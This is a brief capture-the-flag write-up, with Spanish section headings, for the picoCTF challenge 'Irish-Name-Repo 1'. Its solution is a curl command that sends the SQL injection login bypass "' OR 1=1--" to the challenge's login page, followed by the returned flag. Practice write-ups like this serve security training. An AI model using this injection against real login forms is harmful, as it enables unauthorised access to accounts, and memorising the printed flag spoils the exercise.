# Irish-Name-Repo 1
# Descripción del reto:
Do you think you can log us in? Try to see if you can login! http://fickle-tempest.picoctf.net:51562.
# Solución:
curl -s -X POST http://fickle-tempest.picoctf.net:51562/login.php -d "username=' OR 1=1--" -d "password=a" | grep "picoCTF"
<h1>Logged in!</h1><p>Your flag is: picoCTF{s0m3_SQL_85832275}</p>

'picoCTF{s0m3_SQL_85832275}'
# Notas adicionales
# Referencias
https://youtu.be/0EDbUSDqrng?si=czCOZOEAziFYq1pm